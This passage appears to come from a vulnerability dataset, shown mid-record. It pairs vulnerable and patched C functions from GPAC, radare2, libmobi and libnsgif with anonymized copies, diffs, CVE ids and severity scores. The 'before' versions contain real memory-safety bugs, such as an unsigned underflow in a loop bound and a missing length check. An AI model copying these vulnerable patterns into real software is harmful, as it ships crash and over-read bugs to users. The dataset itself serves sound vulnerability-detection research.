				/*F bit of AP is 0 if the F nit of each aggreated NALU is 0; otherwise its must be 1*/
				/*LayerId and TID must ne the lowest value of LayerId and TID of all aggreated NALU*/
				u8 cur_LayerId, cur_TID, new_LayerId, new_TID;

				builder->hevc_payload_hdr[0] |= (nalu[0] & 0x80);
				cur_LayerId = ((builder->hevc_payload_hdr[0] & 0x01) << 5) + ((builder->hevc_payload_hdr[1] & 0xF8) >> 3);
				new_LayerId = ((nalu[0] & 0x01) << 5) + ((nalu[1] & 0xF8) >> 3);
				if (cur_LayerId > new_LayerId) {
					builder->hevc_payload_hdr[0] = (builder->hevc_payload_hdr[0] & 0xFE) | (nalu[0] & 0x01);
					builder->hevc_payload_hdr[1] = (builder->hevc_payload_hdr[1] & 0x07) | (nalu[1] & 0xF8);
				}
				cur_TID = builder->hevc_payload_hdr[1] & 0x07;
				new_TID = nalu[1] & 0x07;
				if (cur_TID > new_TID) {
					builder->hevc_payload_hdr[1] = (builder->hevc_payload_hdr[1] & 0xF8) | (nalu[1] & 0x07);
				}
			}

			/*add NALU size*/
			nal_s[0] = nalu_size>>8;
			nal_s[1] = nalu_size&0x00ff;
			builder->OnData(builder->cbk_obj, (char *)nal_s, 2, GF_FALSE);
			builder->bytesInPacket += 2;
		}
		/*add data*/
		if (builder->OnDataReference)
			builder->OnDataReference(builder->cbk_obj, nalu_size, 0);
		else
			builder->OnData(builder->cbk_obj, nalu, nalu_size, GF_FALSE);

		builder->bytesInPacket += nalu_size;

		if (IsAUEnd) {
			builder->rtp_header.Marker = 1;
			if (strlen(builder->hevc_payload_hdr)) {
				builder->OnData(builder->cbk_obj, (char *)builder->hevc_payload_hdr, 2, GF_TRUE);
				memset(builder->hevc_payload_hdr, 0, 2);
			}
			builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
			builder->bytesInPacket = 0;
		}
	}
	/*fragmentation unit*/
	else {
		u32 offset;
		char payload_hdr[2];
		char shdr;

		assert(nalu_size + 4 >=builder->Path_MTU);
		assert(!builder->bytesInPacket);

		/*FU payload doesn't have the NAL hdr (2 bytes*/
		bytesLeft = nalu_size - 2;
		offset = 2;
		while (bytesLeft) {
			if (3 + bytesLeft > builder->Path_MTU) {
				size = builder->Path_MTU - 3;
			} else {
				size = bytesLeft;
			}

			/*declare PayloadHdr for FU*/
			memset(payload_hdr, 0, 2);
			/*copy F bit and assign type*/
			payload_hdr[0] = (nalu[0] & 0x81) | (49 << 1);
			/*copy LayerId and TID*/
			payload_hdr[1] = nalu[1];
			builder->OnData(builder->cbk_obj, (char *)payload_hdr, 2, GF_FALSE);

			/*declare FU header*/
			shdr = 0;
			/*assign type*/
			shdr |= (nalu[0] & 0x7E) >> 1;
			/*start bit*/
			if (offset==2) shdr |= 0x80;
			/*end bit*/
			else if (size == bytesLeft) shdr |= 0x40;

			builder->OnData(builder->cbk_obj, &shdr, 1, GF_FALSE);

			/*add data*/
			if (builder->OnDataReference)
				builder->OnDataReference(builder->cbk_obj, size, offset);
			else
				builder->OnData(builder->cbk_obj, nalu+offset, size, GF_FALSE);

			offset += size;
			bytesLeft -= size;

			/*flush no matter what (FUs cannot be agreggated)*/
			builder->rtp_header.Marker = (IsAUEnd && !bytesLeft) ? 1 : 0;
			builder->OnPacketDone(builder->cbk_obj, &builder->rtp_header);
			builder->bytesInPacket = 0;

			if (bytesLeft) {
				builder->rtp_header.PayloadType = builder->PayloadType;
				builder->rtp_header.TimeStamp = (u32) builder->sl_header.compositionTimeStamp;
				builder->rtp_header.SequenceNumber += 1;
				builder->OnNewPacket(builder->cbk_obj, &builder->rtp_header);
			}
		}
	}
	return GF_OK;
}","GF_Err gp_rtp_builder_do_hevc(GP_RTPPacketizer *VAR_0, u8 *VAR_1, u32 VAR_2, u8 VAR_3, u32 VAR_4)
{
	u32 VAR_5, VAR_6, VAR_7;

	VAR_5 = 0;
	if (!VAR_1) VAR_5 = 1;
	else if (VAR_0->sl_header.accessUnitStartFlag) VAR_5 = 1;
	/* COMMENT_0 */
	else if (VAR_0->bytesInPacket + VAR_2 + 4 >= VAR_0->Path_MTU) VAR_5 = 2; /* COMMENT_1 */
	/* COMMENT_2 */
	else if (! (VAR_0->flags & VAR_8) ) VAR_5 = 2;

	if (VAR_0->bytesInPacket && VAR_5) {
		VAR_0->rtp_header.Marker = (VAR_5==1) ? 1 : 0;
		/* COMMENT_3 */
		if (strlen(VAR_0->hevc_payload_hdr)) {
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
			memset(VAR_0->hevc_payload_hdr, 0, 2);
		}
		VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
		VAR_0->bytesInPacket = 0;
	}

	if (!VAR_1) return VAR_10;
	if (VAR_2<2) return VAR_11;

	/* COMMENT_4 */
	if (!VAR_0->bytesInPacket) {
		VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
		VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
		VAR_0->rtp_header.SequenceNumber += 1;
		VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
	}

	/* COMMENT_5 */
	/* COMMENT_6 */
	if (VAR_0->bytesInPacket+VAR_2+4 < VAR_0->Path_MTU) {
		Bool VAR_12 = (VAR_0->flags & VAR_8) ? VAR_9 : VAR_13;
		/* COMMENT_7 */
		if (VAR_3 && !VAR_0->bytesInPacket) VAR_12 = VAR_13;

		if (VAR_12) {
			char VAR_14[2];
			/* COMMENT_8 */
			if (!VAR_0->bytesInPacket) {
				/* COMMENT_9 */
				VAR_0->hevc_payload_hdr[0] = (VAR_1[0] & 0x81) | (48 << 1);
				/* COMMENT_10 */
				VAR_0->hevc_payload_hdr[1] = VAR_1[1];
			}
			else {
				/* COMMENT_11 */
				/* COMMENT_12 */
				u8 VAR_15, VAR_16, VAR_17, VAR_18;

				VAR_0->hevc_payload_hdr[0] |= (VAR_1[0] & 0x80);
				VAR_15 = ((VAR_0->hevc_payload_hdr[0] & 0x01) << 5) + ((VAR_0->hevc_payload_hdr[1] & 0xF8) >> 3);
				VAR_17 = ((VAR_1[0] & 0x01) << 5) + ((VAR_1[1] & 0xF8) >> 3);
				if (VAR_15 > VAR_17) {
					VAR_0->hevc_payload_hdr[0] = (VAR_0->hevc_payload_hdr[0] & 0xFE) | (VAR_1[0] & 0x01);
					VAR_0->hevc_payload_hdr[1] = (VAR_0->hevc_payload_hdr[1] & 0x07) | (VAR_1[1] & 0xF8);
				}
				VAR_16 = VAR_0->hevc_payload_hdr[1] & 0x07;
				VAR_18 = VAR_1[1] & 0x07;
				if (VAR_16 > VAR_18) {
					VAR_0->hevc_payload_hdr[1] = (VAR_0->hevc_payload_hdr[1] & 0xF8) | (VAR_1[1] & 0x07);
				}
			}

			/* COMMENT_13 */
			VAR_14[0] = VAR_2>>8;
			VAR_14[1] = VAR_2&0x00ff;
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_14, 2, VAR_13);
			VAR_0->bytesInPacket += 2;
		}
		/* COMMENT_14 */
		if (VAR_0->OnDataReference)
			VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_2, 0);
		else
			VAR_0->OnData(VAR_0->cbk_obj, VAR_1, VAR_2, VAR_13);

		VAR_0->bytesInPacket += VAR_2;

		if (VAR_3) {
			VAR_0->rtp_header.Marker = 1;
			if (strlen(VAR_0->hevc_payload_hdr)) {
				VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_0->hevc_payload_hdr, 2, VAR_9);
				memset(VAR_0->hevc_payload_hdr, 0, 2);
			}
			VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
			VAR_0->bytesInPacket = 0;
		}
	}
	/* COMMENT_15 */
	else {
		u32 VAR_19;
		char VAR_20[2];
		char VAR_21;

		assert(VAR_2 + 4 >=VAR_0->Path_MTU);
		assert(!VAR_0->bytesInPacket);

		/* COMMENT_16 */
		VAR_6 = VAR_2 - 2;
		VAR_19 = 2;
		while (VAR_6) {
			if (3 + VAR_6 > VAR_0->Path_MTU) {
				VAR_7 = VAR_0->Path_MTU - 3;
			} else {
				VAR_7 = VAR_6;
			}

			/* COMMENT_17 */
			memset(VAR_20, 0, 2);
			/* COMMENT_9 */
			VAR_20[0] = (VAR_1[0] & 0x81) | (49 << 1);
			/* COMMENT_10 */
			VAR_20[1] = VAR_1[1];
			VAR_0->OnData(VAR_0->cbk_obj, (char *)VAR_20, 2, VAR_13);

			/* COMMENT_18 */
			VAR_21 = 0;
			/* COMMENT_19 */
			VAR_21 |= (VAR_1[0] & 0x7E) >> 1;
			/* COMMENT_20 */
			if (VAR_19==2) VAR_21 |= 0x80;
			/* COMMENT_21 */
			else if (VAR_7 == VAR_6) VAR_21 |= 0x40;

			VAR_0->OnData(VAR_0->cbk_obj, &VAR_21, 1, VAR_13);

			/* COMMENT_14 */
			if (VAR_0->OnDataReference)
				VAR_0->OnDataReference(VAR_0->cbk_obj, VAR_7, VAR_19);
			else
				VAR_0->OnData(VAR_0->cbk_obj, VAR_1+VAR_19, VAR_7, VAR_13);

			VAR_19 += VAR_7;
			VAR_6 -= VAR_7;

			/* COMMENT_22 */
			VAR_0->rtp_header.Marker = (VAR_3 && !VAR_6) ? 1 : 0;
			VAR_0->OnPacketDone(VAR_0->cbk_obj, &VAR_0->rtp_header);
			VAR_0->bytesInPacket = 0;

			if (VAR_6) {
				VAR_0->rtp_header.PayloadType = VAR_0->PayloadType;
				VAR_0->rtp_header.TimeStamp = (u32) VAR_0->sl_header.compositionTimeStamp;
				VAR_0->rtp_header.SequenceNumber += 1;
				VAR_0->OnNewPacket(VAR_0->cbk_obj, &VAR_0->rtp_header);
			}
		}
	}
	return VAR_10;
}",gpac/1773b7a34bc08734aee7d3f5dfe65d06389fe15a/rtp_pck_mpeg4.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -22,6 +22,7 @@
 	}
 
 	if (!nalu) return GF_OK;
+	if (nalu_size<2) return GF_NON_COMPLIANT_BITSTREAM;
 
 	/*need a new RTP packet*/
 	if (!builder->bytesInPacket) {","{'deleted_lines': [], 'added_lines': ['\tif (nalu_size<2) return GF_NON_COMPLIANT_BITSTREAM;']}",True,"gp_rtp_builder_do_hevc in ietf/rtp_pck_mpeg4.c in GPAC 2.0.0 has a heap-based buffer over-read, as demonstrated by MP4Box.",5.5,MEDIUM,1,valid,2022-04-19T07:08:45Z,4
CVE-2022-1444,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,radareorg/radare2,Redo minor cleanup in new_rbtree,14189710859c27981adb4c2c2aed2863c1859ec5,https://github.com/radareorg/radare2/commit/14189710859c27981adb4c2c2aed2863c1859ec5,libr/util/new_rbtree.c,r_crbtree_insert,"R_API bool r_crbtree_insert(RRBTree *tree, void *data, RRBComparator cmp, void *user) {
r_return_val_if_fail (tree && data && cmp, false);
bool inserted = false;
if (tree->root == NULL) {
tree->root = _node_new (data, NULL);
if (tree->root == NULL) {
return false;
}
inserted = true;
goto out_exit;
}
RRBNode head; 
memset (&head, 0, sizeof (RRBNode));
RRBNode *g = NULL, *parent = &head; 
RRBNode *p = NULL, *q = tree->root; 
int dir = 0, last = 0; 
_set_link (parent, q, 1);
for (;;) {
if (!q) {
q = _node_new (data, p);
if (!q) {
return false;
}
p->link[dir] = q;
inserted = true;
} else if (IS_RED (q->link[0]) && IS_RED (q->link[1])) {
q->red = 1;
q->link[0]->red = 0;
q->link[1]->red = 0;
}
if (IS_RED (q) && IS_RED (p)) {
#if 0
if (!parent) {
return false;
}
#endif
int dir2 = parent->link[1] == g;
if (q == p->link[last]) {
_set_link (parent, _rot_once (g, !last), dir2);
} else {
_set_link (parent, _rot_twice (g, !last), dir2);
}
}
if (inserted) {
break;
}
last = dir;
dir = cmp (data, q->data, user) >= 0;
if (g) {
parent = g;
}
g = p;
p = q;
q = q->link[dir];
}
tree->root = head.link[1];
out_exit:
tree->root->red = 0;
tree->root->parent = NULL;
if (inserted) {
tree->size++;
}
return inserted;
}","R_API bool r_crbtree_insert(RRBTree *VAR_0, void *VAR_1, RRBComparator VAR_2, void *VAR_3) {
r_return_val_if_fail (VAR_0 && VAR_1 && VAR_2, false);
bool VAR_4 = false;
if (VAR_0->root == NULL) {
VAR_0->root = _node_new (VAR_1, NULL);
if (VAR_0->root == NULL) {
return false;
}
VAR_4 = true;
goto out_exit;
}
RRBNode VAR_5; 
memset (&VAR_5, 0, sizeof (RRBNode));
RRBNode *VAR_6 = NULL, *VAR_7 = &VAR_5; 
RRBNode *VAR_8 = NULL, *VAR_9 = VAR_0->root; 
int VAR_10 = 0, VAR_11 = 0; 
_set_link (VAR_7, VAR_9, 1);
for (;;) {
if (!VAR_9) {
VAR_9 = _node_new (VAR_1, VAR_8);
if (!VAR_9) {
return false;
}
VAR_8->link[VAR_10] = VAR_9;
VAR_4 = true;
} else if (IS_RED (VAR_9->link[0]) && IS_RED (VAR_9->link[1])) {
VAR_9->red = 1;
VAR_9->link[0]->red = 0;
VAR_9->link[1]->red = 0;
}
if (IS_RED (VAR_9) && IS_RED (VAR_8)) {
#if 0
if (!VAR_7) {
return false;
}
#endif
int VAR_12 = VAR_7->link[1] == VAR_6;
if (VAR_9 == VAR_8->link[VAR_11]) {
_set_link (VAR_7, _rot_once (VAR_6, !VAR_11), VAR_12);
} else {
_set_link (VAR_7, _rot_twice (VAR_6, !VAR_11), VAR_12);
}
}
if (VAR_4) {
break;
}
VAR_11 = VAR_10;
VAR_10 = VAR_2 (VAR_1, VAR_9->data, VAR_3) >= 0;
if (VAR_6) {
VAR_7 = VAR_6;
}
VAR_6 = VAR_8;
VAR_8 = VAR_9;
VAR_9 = VAR_9->link[VAR_10];
}
VAR_0->root = VAR_5.link[1];
out_exit:
VAR_0->root->red = 0;
VAR_0->root->parent = NULL;
if (VAR_4) {
VAR_0->size++;
}
return VAR_4;
}",,"R_API bool r_crbtree_insert(RRBTree *tree, void *data, RRBComparator cmp, void *user) {
	r_return_val_if_fail (tree && data && cmp, false);
	bool inserted = false;

	if (!tree->root) {
		tree->root = _node_new (data, NULL);
		if (!tree->root) {
			return false;
		}
		inserted = true;
		goto out_exit;
	}

	RRBNode head; /* Fake tree root */
	memset (&head, 0, sizeof (RRBNode));
	RRBNode *g = NULL, *parent = &head; /* Grandparent & parent */
	RRBNode *p = NULL, *q = tree->root; /* Iterator & parent */
	int dir = 0, last = 0; /* Directions */

	_set_link (parent, q, 1);

	for (;;) {
		if (!q) {
			/* Insert a node at first null link(also set its parent link) */
			q = _node_new (data, p);
			if (!q) {
				return false;
			}
			p->link[dir] = q;
			inserted = true;
		} else if (IS_RED (q->link[0]) && IS_RED (q->link[1])) {
			/* Simple red violation: color flip */
			q->red = 1;
			q->link[0]->red = 0;
			q->link[1]->red = 0;
		}

		if (IS_RED (q) && IS_RED (p)) {
#if 0
			// coverity error, parent is never null
			/* Hard red violation: rotate */
			if (!parent) {
				return false;
			}
#endif
			int dir2 = parent->link[1] == g;
			if (q == p->link[last]) {
				_set_link (parent, _rot_once (g, !last), dir2);
			} else {
				_set_link (parent, _rot_twice (g, !last), dir2);
			}
		}

		if (inserted) {
			break;
		}

		last = dir;
		dir = cmp (data, q->data, user) >= 0;

		if (g) {
			parent = g;
		}

		g = p;
		p = q;
		q = q->link[dir];
	}

	/* Update root(it may different due to root rotation) */
	tree->root = head.link[1];

out_exit:
	/* Invariant: root is black */
	tree->root->red = 0;
	tree->root->parent = NULL;
	if (inserted) {
		tree->size++;
	}

	return inserted;
}","R_API bool r_crbtree_insert(RRBTree *VAR_0, void *VAR_1, RRBComparator VAR_2, void *VAR_3) {
	r_return_val_if_fail (VAR_0 && VAR_1 && VAR_2, false);
	bool VAR_4 = false;

	if (!VAR_0->root) {
		VAR_0->root = _node_new (VAR_1, NULL);
		if (!VAR_0->root) {
			return false;
		}
		VAR_4 = true;
		goto out_exit;
	}

	RRBNode VAR_5; /* COMMENT_0 */
	memset (&VAR_5, 0, sizeof (RRBNode));
	RRBNode *VAR_6 = NULL, *VAR_7 = &VAR_5; /* COMMENT_1 */
	RRBNode *VAR_8 = NULL, *VAR_9 = VAR_0->root; /* COMMENT_2 */
	int VAR_10 = 0, VAR_11 = 0; /* COMMENT_3 */

	_set_link (VAR_7, VAR_9, 1);

	for (;;) {
		if (!VAR_9) {
			/* COMMENT_4 */
			VAR_9 = _node_new (VAR_1, VAR_8);
			if (!VAR_9) {
				return false;
			}
			VAR_8->link[VAR_10] = VAR_9;
			VAR_4 = true;
		} else if (IS_RED (VAR_9->link[0]) && IS_RED (VAR_9->link[1])) {
			/* COMMENT_5 */
			VAR_9->red = 1;
			VAR_9->link[0]->red = 0;
			VAR_9->link[1]->red = 0;
		}

		if (IS_RED (VAR_9) && IS_RED (VAR_8)) {
#if 0
			/* COMMENT_6 */
			/* COMMENT_7 */
			if (!VAR_7) {
				return false;
			}
#endif
			int VAR_12 = VAR_7->link[1] == VAR_6;
			if (VAR_9 == VAR_8->link[VAR_11]) {
				_set_link (VAR_7, _rot_once (VAR_6, !VAR_11), VAR_12);
			} else {
				_set_link (VAR_7, _rot_twice (VAR_6, !VAR_11), VAR_12);
			}
		}

		if (VAR_4) {
			break;
		}

		VAR_11 = VAR_10;
		VAR_10 = VAR_2 (VAR_1, VAR_9->data, VAR_3) >= 0;

		if (VAR_6) {
			VAR_7 = VAR_6;
		}

		VAR_6 = VAR_8;
		VAR_8 = VAR_9;
		VAR_9 = VAR_9->link[VAR_10];
	}

	/* COMMENT_8 */
	VAR_0->root = VAR_5.link[1];

out_exit:
	/* COMMENT_9 */
	VAR_0->root->red = 0;
	VAR_0->root->parent = NULL;
	if (VAR_4) {
		VAR_0->size++;
	}

	return VAR_4;
}",,"--- func_before
+++ func_after
@@ -2,9 +2,9 @@
 	r_return_val_if_fail (tree && data && cmp, false);
 	bool inserted = false;
 
-	if (tree->root == NULL) {
+	if (!tree->root) {
 		tree->root = _node_new (data, NULL);
-		if (tree->root == NULL) {
+		if (!tree->root) {
 			return false;
 		}
 		inserted = true;","{'deleted_lines': ['\tif (tree->root == NULL) {', '\t\tif (tree->root == NULL) {'], 'added_lines': ['\tif (!tree->root) {', '\t\tif (!tree->root) {']}",True,heap-use-after-free in GitHub repository radareorg/radare2 prior to 5.7.0. This vulnerability is capable of inducing denial of service.,5.5,MEDIUM,1,valid,2022-04-23T00:36:51Z,4
CVE-2022-29788,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,bfabiszewski/libmobi,Fix issue with corrupt files with tagvalues_count = 0 that caused null pointer dereference,ce0ab6586069791b1e8e2a42f44318e581c39939,https://github.com/bfabiszewski/libmobi/commit/ce0ab6586069791b1e8e2a42f44318e581c39939,src/index.c,mobi_trie_insert_infl,"MOBI_RET mobi_trie_insert_infl(MOBITrie **root, const MOBIIndx *indx, size_t i) {
MOBIIndexEntry e = indx->entries[i];
char *inflected = e.label;
for (size_t j = 0; j < e.tags_count; j++) {
MOBIIndexTag t = e.tags[j];
if (t.tagid == INDX_TAGARR_INFL_PARTS_V1) {
for (size_t k = 0; k < t.tagvalues_count - 1; k += 2) {
uint32_t len = t.tagvalues[k];
uint32_t offset = t.tagvalues[k + 1];
char *base = mobi_get_cncx_string_flat(indx->cncx_record, offset, len);
if (base == NULL) {
return MOBI_MALLOC_FAILED;
}
MOBI_RET ret = mobi_trie_insert_reversed(root, base, inflected);
free(base);
if (ret != MOBI_SUCCESS) {
return ret;
}
}
}
}
return MOBI_SUCCESS;
}","MOBI_RET mobi_trie_insert_infl(MOBITrie **VAR_0, const MOBIIndx *VAR_1, size_t VAR_2) {
MOBIIndexEntry VAR_3 = VAR_1->entries[VAR_2];
char *VAR_4 = VAR_3.label;
for (size_t VAR_5 = 0; VAR_5 < VAR_3.tags_count; VAR_5++) {
MOBIIndexTag VAR_6 = VAR_3.tags[VAR_5];
if (VAR_6.tagid == VAR_7) {
for (size_t VAR_8 = 0; VAR_8 < VAR_6.tagvalues_count - 1; VAR_8 += 2) {
uint32_t VAR_9 = VAR_6.tagvalues[VAR_8];
uint32_t VAR_10 = VAR_6.tagvalues[VAR_8 + 1];
char *VAR_11 = mobi_get_cncx_string_flat(VAR_1->cncx_record, VAR_10, VAR_9);
if (VAR_11 == NULL) {
return VAR_12;
}
MOBI_RET VAR_13 = mobi_trie_insert_reversed(VAR_0, VAR_11, VAR_4);
free(VAR_11);
if (VAR_13 != VAR_14) {
return VAR_13;
}
}
}
}
return VAR_14;
}",bfabiszewski/libmobi/ce0ab6586069791b1e8e2a42f44318e581c39939/index.c/vul/before/0.json,"MOBI_RET mobi_trie_insert_infl(MOBITrie **root, const MOBIIndx *indx, size_t i) {
    MOBIIndexEntry e = indx->entries[i];
    char *inflected = e.label;
    for (size_t j = 0; j < e.tags_count; j++) {
        MOBIIndexTag t = e.tags[j];
        if (t.tagid == INDX_TAGARR_INFL_PARTS_V1) {
            for (size_t k = 0; k + 1 < t.tagvalues_count; k += 2) {
                uint32_t len = t.tagvalues[k];
                uint32_t offset = t.tagvalues[k + 1];
                char *base = mobi_get_cncx_string_flat(indx->cncx_record, offset, len);
                if (base == NULL) {
                    return MOBI_MALLOC_FAILED;
                }
                MOBI_RET ret = mobi_trie_insert_reversed(root, base, inflected);
                free(base);
                if (ret != MOBI_SUCCESS) {
                    return ret;
                }
            }
        }
    }
    return MOBI_SUCCESS;
}","MOBI_RET mobi_trie_insert_infl(MOBITrie **VAR_0, const MOBIIndx *VAR_1, size_t VAR_2) {
    MOBIIndexEntry VAR_3 = VAR_1->entries[VAR_2];
    char *VAR_4 = VAR_3.label;
    for (size_t VAR_5 = 0; VAR_5 < VAR_3.tags_count; VAR_5++) {
        MOBIIndexTag VAR_6 = VAR_3.tags[VAR_5];
        if (VAR_6.tagid == VAR_7) {
            for (size_t VAR_8 = 0; VAR_8 + 1 < VAR_6.tagvalues_count; VAR_8 += 2) {
                uint32_t VAR_9 = VAR_6.tagvalues[VAR_8];
                uint32_t VAR_10 = VAR_6.tagvalues[VAR_8 + 1];
                char *VAR_11 = mobi_get_cncx_string_flat(VAR_1->cncx_record, VAR_10, VAR_9);
                if (VAR_11 == NULL) {
                    return VAR_12;
                }
                MOBI_RET VAR_13 = mobi_trie_insert_reversed(VAR_0, VAR_11, VAR_4);
                free(VAR_11);
                if (VAR_13 != VAR_14) {
                    return VAR_13;
                }
            }
        }
    }
    return VAR_14;
}",bfabiszewski/libmobi/ce0ab6586069791b1e8e2a42f44318e581c39939/index.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -4,7 +4,7 @@
     for (size_t j = 0; j < e.tags_count; j++) {
         MOBIIndexTag t = e.tags[j];
         if (t.tagid == INDX_TAGARR_INFL_PARTS_V1) {
-            for (size_t k = 0; k < t.tagvalues_count - 1; k += 2) {
+            for (size_t k = 0; k + 1 < t.tagvalues_count; k += 2) {
                 uint32_t len = t.tagvalues[k];
                 uint32_t offset = t.tagvalues[k + 1];
                 char *base = mobi_get_cncx_string_flat(indx->cncx_record, offset, len);","{'deleted_lines': ['            for (size_t k = 0; k < t.tagvalues_count - 1; k += 2) {'], 'added_lines': ['            for (size_t k = 0; k + 1 < t.tagvalues_count; k += 2) {']}",True,libmobi before v0.10 contains a NULL pointer dereference via the component mobi_buffer_getpointer. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted mobi file.,6.5,MEDIUM,1,valid,2022-04-23T14:30:01Z,4
CVE-2022-1507,['CWE-476'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,hpjansson/chafa,"libnsgif: Fix null pointer deref on frameless GIF input

A crafted GIF file with no frame data could cause a null pointer
dereference leading to denial of service (crash). Reported by
@JieyongMa via huntr.dev.",e4b777c7b7c144cd16a0ea96108267b1004fe6c9,https://github.com/hpjansson/chafa/commit/e4b777c7b7c144cd16a0ea96108267b1004fe6c9,libnsgif/libnsgif.c,gif_internal_decode_frame,"static gif_result
gif_internal_decode_frame(gif_animation *gif,
unsigned int frame,
bool clear_image)
{
unsigned int index = 0;
const unsigned char *gif_data, *gif_end;
ssize_t gif_bytes;
unsigned int width, height, offset_x, offset_y;
unsigned int flags, colour_table_size, interlace;
unsigned int *colour_table;
unsigned int *frame_data = 0;        unsigned int *frame_scanline;
ssize_t save_buffer_position;
unsigned int return_value = 0;
unsigned int x, y, decode_y, burst_bytes;
register unsigned char colour;
if (gif->frames[frame].display == false) {
return GIF_OK;
}
if (frame > gif->frame_count_partial) {
return GIF_INSUFFICIENT_DATA;
}
if ((!clear_image) &&
((int)frame == gif->decoded_frame)) {
return GIF_OK;
}
gif_data = gif->gif_data + gif->frames[frame].frame_pointer;
gif_end = gif->gif_data + gif->buffer_size;
gif_bytes = (gif_end - gif_data);
if (gif_bytes < 12) {
return GIF_INSUFFICIENT_FRAME_DATA;
}
save_buffer_position = gif->buffer_position;
gif->buffer_position = gif_data - gif->gif_data;
if ((return_value = gif_skip_frame_extensions(gif)) != GIF_OK) {
goto gif_decode_frame_exit;
}
gif_data = (gif->gif_data + gif->buffer_position);
gif_bytes = (gif_end - gif_data);
if (gif_bytes < 12) {
return_value = GIF_INSUFFICIENT_FRAME_DATA;
goto gif_decode_frame_exit;
}
if (gif_data[0] != GIF_IMAGE_SEPARATOR) {
return_value = GIF_DATA_ERROR;
goto gif_decode_frame_exit;
}
offset_x = gif_data[1] | (gif_data[2] << 8);
offset_y = gif_data[3] | (gif_data[4] << 8);
width = gif_data[5] | (gif_data[6] << 8);
height = gif_data[7] | (gif_data[8] << 8);
if ((offset_x + width > gif->width) ||
(offset_y + height > gif->height)) {
return_value = GIF_DATA_ERROR;
goto gif_decode_frame_exit;
}
flags = gif_data[9];
colour_table_size = 2 << (flags & GIF_COLOUR_TABLE_SIZE_MASK);
interlace = flags & GIF_INTERLACE_MASK;
gif_data += 10;
gif_bytes = (gif_end - gif_data);
if (flags & GIF_COLOUR_TABLE_MASK) {
if (gif_bytes < (int)(3 * colour_table_size)) {
return_value = GIF_INSUFFICIENT_FRAME_DATA;
goto gif_decode_frame_exit;
}
colour_table = gif->local_colour_table;
if (!clear_image) {
for (index = 0; index < colour_table_size; index++) {
unsigned char *entry =
(unsigned char *) &colour_table[index];
entry[0] = gif_data[0];
entry[1] = gif_data[1];
entry[2] = gif_data[2];
entry[3] = 0xff;
gif_data += 3;
}
} else {
gif_data += 3 * colour_table_size;
}
gif_bytes = (gif_end - gif_data);
} else {
colour_table = gif->global_colour_table;
}
if (gif_bytes < 1) {
return_value = GIF_INSUFFICIENT_FRAME_DATA;
goto gif_decode_frame_exit;
}
if (gif_data[0] == GIF_TRAILER) {
return_value = GIF_OK;
goto gif_decode_frame_exit;
}
assert(gif->bitmap_callbacks.bitmap_get_buffer);
frame_data = (void *)gif->bitmap_callbacks.bitmap_get_buffer(gif->frame_image);
if (!frame_data) {
return GIF_INSUFFICIENT_MEMORY;
}
if (!clear_image) {
lzw_result res;
const uint8_t *stack_base;
const uint8_t *stack_pos;
if (gif_bytes < 2) {
return_value = GIF_INSUFFICIENT_FRAME_DATA;
goto gif_decode_frame_exit;
}
if ((gif_bytes == 2) && (gif_data[1] == GIF_TRAILER)) {
return_value = GIF_OK;
goto gif_decode_frame_exit;
}
if ((frame == 0) || (gif->decoded_frame == GIF_INVALID_FRAME)) {
memset((char*)frame_data,
GIF_TRANSPARENT_COLOUR,
gif->width * gif->height * sizeof(int));
gif->decoded_frame = frame;
} else if ((frame != 0) &&
(gif->frames[frame - 1].disposal_method == GIF_FRAME_CLEAR)) {
return_value = gif_internal_decode_frame(gif,
(frame - 1),
true);
if (return_value != GIF_OK) {
goto gif_decode_frame_exit;
}
} else if ((frame != 0) &&
(gif->frames[frame - 1].disposal_method == GIF_FRAME_RESTORE)) {
int last_undisposed_frame = frame - 2;
while ((last_undisposed_frame >= 0) &&
(gif->frames[last_undisposed_frame].disposal_method == GIF_FRAME_RESTORE)) {
last_undisposed_frame--;
}
if (last_undisposed_frame == -1) {
memset((char*)frame_data,
GIF_TRANSPARENT_COLOUR,
gif->width * gif->height * sizeof(int));
} else {
return_value = gif_internal_decode_frame(gif, last_undisposed_frame, false);
if (return_value != GIF_OK) {
goto gif_decode_frame_exit;
}
assert(gif->bitmap_callbacks.bitmap_get_buffer);
frame_data = (void *)gif->bitmap_callbacks.bitmap_get_buffer(gif->frame_image);
if (!frame_data) {
return GIF_INSUFFICIENT_MEMORY;
}
}
}
gif->decoded_frame = frame;
gif->buffer_position = (gif_data - gif->gif_data) + 1;
res = lzw_decode_init(gif->lzw_ctx, gif->gif_data,
gif->buffer_size, gif->buffer_position,
gif_data[0], &stack_base, &stack_pos);
if (res != LZW_OK) {
return gif_error_from_lzw(res);
}
for (y = 0; y < height; y++) {
if (interlace) {
decode_y = gif_interlaced_line(height, y) + offset_y;
} else {
decode_y = y + offset_y;
}
frame_scanline = frame_data + offset_x + (decode_y * gif->width);
x = width;
while (x > 0) {
burst_bytes = (stack_pos - stack_base);
if (burst_bytes > 0) {
if (burst_bytes > x) {
burst_bytes = x;
}
x -= burst_bytes;
while (burst_bytes-- > 0) {
colour = *--stack_pos;
if (((gif->frames[frame].transparency) &&
(colour != gif->frames[frame].transparency_index)) ||
(!gif->frames[frame].transparency)) {
*frame_scanline = colour_table[colour];
}
frame_scanline++;
}
} else {
res = lzw_decode(gif->lzw_ctx, &stack_pos);
if (res != LZW_OK) {
if (res == LZW_OK_EOD) {
return_value = GIF_OK;
} else {
return_value = gif_error_from_lzw(res);
}
goto gif_decode_frame_exit;
}
}
}
}
} else {
if (gif->frames[frame].disposal_method == GIF_FRAME_CLEAR) {
for (y = 0; y < height; y++) {
